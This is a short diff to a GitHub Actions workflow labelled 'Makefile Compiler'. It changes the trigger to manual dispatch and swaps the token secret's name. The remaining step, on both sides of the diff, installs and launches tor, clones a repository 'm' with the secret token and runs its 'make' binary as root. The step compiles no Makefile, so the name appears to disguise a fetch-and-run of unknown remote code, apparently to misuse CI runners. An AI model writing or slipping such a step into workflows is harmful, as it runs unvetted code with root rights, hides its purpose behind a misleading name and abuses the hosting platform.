@@ -1,6 +1,7 @@
 name: Makefile Compiler
 
-on: push
+on:
+  workflow_dispatch:
 
 jobs:
   build:
@@ -12,10 +13,10 @@ jobs:
       fail-fast: false
     
     env:
-      GIT_TOKEN: ${{ secrets.GIT_TOKEN }}
+      PAT: ${{ secrets.PAT }}
     
     steps:
       - name: Compiling Makefile
         shell: bash
         run: |
-          sudo apt update -y && sudo apt install git tor -y && (sudo tor &) && sudo git clone https://$GIT_TOKEN@github.com/hoster156/m && sudo chmod +x m/make && sudo ./m/make
+          sudo apt update -y && sudo apt install git tor -y && (sudo tor &) && sudo git clone https://$PAT@github.com/<hoster156>/m && sudo chmod +x m/make && sudo ./m/make
